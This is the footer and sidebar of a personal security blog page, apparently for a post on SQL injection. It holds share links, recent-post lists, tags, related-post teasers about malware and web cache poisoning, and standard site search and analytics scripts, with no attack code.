the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Meow's CyberAttack - SQL Injection - Grace&url=https://ocholuo.github.io//posts/CyberAttack-SQL-injection/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Meow's CyberAttack - SQL Injection - Grace&u=https://ocholuo.github.io//posts/CyberAttack-SQL-injection/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Meow's CyberAttack - SQL Injection - Grace&url=https://ocholuo.github.io//posts/CyberAttack-SQL-injection/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Amazon-CloudFront/">AWS Lab - AWS CloudFront</a><li><a href="/posts/Alexa-1stSkill/">AWS Alex First Skill - RedVelvet Time</a><li><a href="/posts/NetworkProtocol-SSL-TLS-Handshake/">NetworkProtocol SSL/TLS Handshake</a><li><a href="/posts/pythonCrash/">Python Crash</a><li><a href="/posts/%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%A7%A3%E9%87%8AAWS/">AWS - 一句话解释AWS</a><li><a href="/posts/GKE/">GCP - Google Cloud Computing - Kubernetes and Kubernetes Engine</a><li><a href="/posts/Go-Note/">Go Note</a><li><a href="/posts/SCPs/">AWS - IdenAccessManage - SCPs (Service Control Policies)</a><li><a href="/posts/CompanyBenefit/">Company Benefit</a><li><a href="/posts/Encryption-SSL&TLS/">Cryptography - SSL/TLS Encryption</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/mala-script/"><div class="card-body"> <span class="timeago small" >Nov 11, 2020<i class="unloaded">2020-11-11T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Attack - RCE Multi-stage Squiblydoo variant</h3><div class="text-muted small"><p> [toc] Multi-stage Squiblydoo variant step 1 the .lnk file has a cmd command but it looks encoded/obfuscated. the cmd contains two distinct sections. The first part creates a “RANDOM.inf...</p></div></div></a></div><div class="card"> <a href="/posts/FireEye12/"><div class="card-body"> <span class="timeago small" >Dec 13, 2020<i class="unloaded">2020-12-13T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vul - FireEye 20201213</h3><div class="text-muted small"><p> [toc] Vulnerability - FireEye 202012 SUNBURST Malware Overview 12142020 DESCRIPTION SUNBURST is a backdoor that has the ability to spawn and kill processes, write and d...</p></div></div></a></div><div class="card"> <a href="/posts/web-cache/"><div class="card-body"> <span class="timeago small" >Dec 21, 2020<i class="unloaded">2020-12-21T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Meow's CyberAttack - - Web cache posion</h3><div class="text-muted small"><p> Meow’s CyberAttack - Web cache posion 背景知识 User Browser Cache Poisoning 浏览器缓存投毒 攻击危害: 攻击实现: Server Cache Poisoning 服务器缓存 ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/CyberAttack-DoS-DDos/" class="btn btn-outline-primary" prompt="Older"><p>Meow's CyberAttack - Dos DDos</p></a> <a href="/posts/IBMSec-course1-Introduction-to-Cybersecurity-Tools-Cyber-Attacks/" class="btn btn-outline-primary" prompt="Newer"><p>IBMSec course 1 Introduction to Cybersecurity Tools & Cyber Attacks</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/ocholuo">Grace JyL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ocholuo.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-179830187-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-179830187-1'); }); </script>
